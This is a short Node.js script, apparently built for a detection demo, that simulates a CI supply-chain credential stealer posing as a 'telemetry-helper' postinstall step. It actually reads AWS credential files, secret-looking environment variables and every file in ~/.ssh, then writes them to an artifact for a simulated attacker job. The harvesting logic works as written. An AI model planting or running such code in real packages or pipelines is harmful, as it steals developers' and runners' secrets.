// SIMULATED credential stealer for the Tracebit demo. Do not copy into anything real.
//
// It does what the tj-actions/changed-files, Trivy and LiteLLM payloads did on CI runners:
// sweep the AWS credentials file, the environment and ~/.ssh, then "exfiltrate" the loot.
// Here the exfiltration channel is a file the workflow uploads as a short-lived artifact,
// so the attacker job in the same workflow can pick it up from a different machine.
import fs from "node:fs";
import os from "node:os";
import path from "node:path";

const home = os.homedir();
const read = (p) => (fs.existsSync(p) ? fs.readFileSync(p, "utf8") : null);

const loot = {
  awsCredentialsFile: read(path.join(home, ".aws", "credentials")),
  awsConfigFile: read(path.join(home, ".aws", "config")),
  env: Object.fromEntries(
    Object.entries(process.env).filter(([k]) => /AWS|SECRET|TOKEN|KEY/i.test(k) && !/^(GITHUB_|ACTIONS_|RUNNER_)/.test(k)),
  ),
  ssh: {},
};

const sshDir = path.join(home, ".ssh");
if (fs.existsSync(sshDir)) {
  for (const name of fs.readdirSync(sshDir)) {
    const p = path.join(sshDir, name);
    if (fs.statSync(p).isFile()) loot.ssh[name] = read(p);
  }
}

// What a defender would see in the build log: only names, never values.
const profiles = [...(loot.awsCredentialsFile ?? "").matchAll(/^\[([^\]]+)\]/gm)].map((m) => m[1]);
const sshHosts = [...(loot.ssh.config ?? "").matchAll(/^Host\s+(\S+)/gm)].map((m) => m[1]);
console.log("telemetry-helper@2.0.1 postinstall: collecting 'telemetry'...");
console.log(`  AWS profiles in ~/.aws/credentials: ${profiles.join(", ") || "none"}`);
console.log(`  credential-looking env vars: ${Object.keys(loot.env).join(", ") || "none"}`);
console.log(`  files in ~/.ssh: ${Object.keys(loot.ssh).join(", ") || "none"} (hosts: ${sshHosts.join(", ") || "none"})`);

const out = process.env.LOOT_PATH ?? path.join(process.env.RUNNER_TEMP ?? os.tmpdir(), "loot.json");
fs.writeFileSync(out, JSON.stringify(loot), { mode: 0o600 });
console.log(`  exfiltrated to the attacker (${out})`);
